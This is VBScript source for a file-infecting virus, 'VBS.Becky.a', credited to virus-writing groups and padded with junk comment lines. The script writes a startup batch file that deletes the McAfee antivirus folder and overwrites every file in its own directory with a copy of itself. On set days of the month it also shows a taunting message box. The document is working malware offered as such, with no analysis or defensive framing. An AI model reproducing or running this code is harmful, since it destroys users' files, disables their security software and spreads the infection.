'MZђ           o~Yђ.s1Џy§Ў0¬    бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^(‘_S`T"{6
'
'VBS.Becky.a
'by -KD- [Metaphase Vx Team & NoMercyVirusTeam]
On Error Resume Next
'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]D
Dim Becky, WshShell, FSO, VX, AntiAVFile
Randomize
'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]D
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = Wscript.CreateObject("Wscript.Shell")
'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]D
Set AntiAVFile = FSO.CreateTextFile("c:\Windows\WinStart.bat", True)
    AntiAVFile.WriteLine "Deltree c:\progra~1\mcafee\ /y"
AntiAVFile.Close
Becky = Wscript.ScriptFullName
'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]D
VX = Left(Becky, InStrRev(Becky, "\"))
'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]D
For Each target in FSO.GetFolder(VX).Files
  FSO.CopyFile Becky, target.Name, 1
Next
If Day(Now()) = 1 or Day(Now()) = 5 or Day(Now()) = 10 or Day(Now()) = 15 or Day(Now()) = 20 or Day(Now()) = 25  Then
'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]DS¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]D
  MsgBox "We dont have to stay friends" & Chr(13) & Chr(10) & "Lets pretend to be enemys" & Chr(13) & Chr(10) & "Yeah whatever makes you happy.", 4096 , "VBS.Becky.a"
'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]DS¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]D
End If
'Exit Becky-->
'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^'бЮќcлЎЂYF–S¬NЕ–Ќ7]DoЈ’^бЮќcлЎЂYF–S¬NЕ–Ќ7]D
